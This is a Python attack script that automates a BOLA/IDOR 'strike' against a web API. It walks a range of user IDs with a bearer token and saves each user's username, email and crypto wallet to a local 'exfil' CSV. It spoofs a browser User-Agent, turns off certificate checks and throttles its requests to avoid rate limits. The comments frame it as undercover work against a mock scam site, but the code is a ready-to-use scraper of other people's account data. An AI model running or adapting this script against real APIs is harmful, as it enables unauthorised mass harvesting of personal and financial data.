import sys
import subprocess

# --- DEPENDENCY BOOTSTRAPPER ---
def ensure_deps():
    deps = {'requests': 'requests', 'termcolor': 'termcolor'}
    for pkg, module in deps.items():
        try:
            __import__(module)
        except ImportError:
            print(f"[*] Missing '{pkg}'. Auto-installing...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", pkg, "-q"])
ensure_deps()
# -------------------------------

import requests
import time
from termcolor import colored
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def execute_bola_strike(base_api_url, auth_token, start_id=1, end_id=50):
    print(colored(f"--- INITIATING AUTOMATED BOLA/IDOR STRIKE ---", "blue", attrs=["bold"]))
    print(f"[*] Target Endpoint: {base_api_url}[ID]")
    print(f"[*] Testing ID Range: {start_id} to {end_id}")
    
    # Injecting the undercover persona's authorization token
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'Authorization': f'Bearer {auth_token}',
        'Accept': 'application/json'
    }
    
    successful_exfils = 0
    
    with open("bola_exfil_log.csv", "w") as log:
        log.write("User_ID,Username,Email,Wallet\n") # CSV Headers
        
        for user_id in range(start_id, end_id + 1):
            target_url = f"{base_api_url}{user_id}"
            
            try:
                response = requests.get(target_url, headers=headers, timeout=10, verify=False)
                
                if response.status_code == 200:
                    data = response.json()
                    
                    # Extracting targeted JSON keys (Customize based on target API)
                    username = data.get('username', 'Unknown')
                    email = data.get('email', 'Unknown')
                    wallet = data.get('crypto_wallet', 'Unknown')
                    
                    print(colored(f"[!] BOLA SUCCESS (ID {user_id}): {username} | {email}", "green"))
                    
                    # Write to secure offline log
                    log.write(f"{user_id},{username},{email},{wallet}\n")
                    successful_exfils += 1
                    
                elif response.status_code == 401 or response.status_code == 403:
                    print(colored(f"[-] Access Denied (ID {user_id}). Authorization enforced.", "yellow"))
                    break # Stop looping if our token is entirely invalid
                else:
                    # 404 Not Found implies the user ID doesn't exist yet
                    print(f"[*] ID {user_id} not found.")
                    
                time.sleep(0.5) # Anti-Rate Limiting Sleep
                
            except Exception as e:
                print(colored(f"[-] Network failure on ID {user_id}: {e}", "red"))

    print(colored(f"\n[✓] Strike Complete. {successful_exfils} profiles exfiltrated to bola_exfil_log.csv", "blue", attrs=["bold"]))

if __name__ == "__main__":
    # Example Target: A vulnerable mock API endpoint
    target_api = "http://mock-investment-scam.com/api/v1/investors/"
    # A dummy token representing our undercover account login
    dummy_token = "eyJhGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.dummy_payload.signature" 
    
    execute_bola_strike(target_api, dummy_token, start_id=100, end_id=120)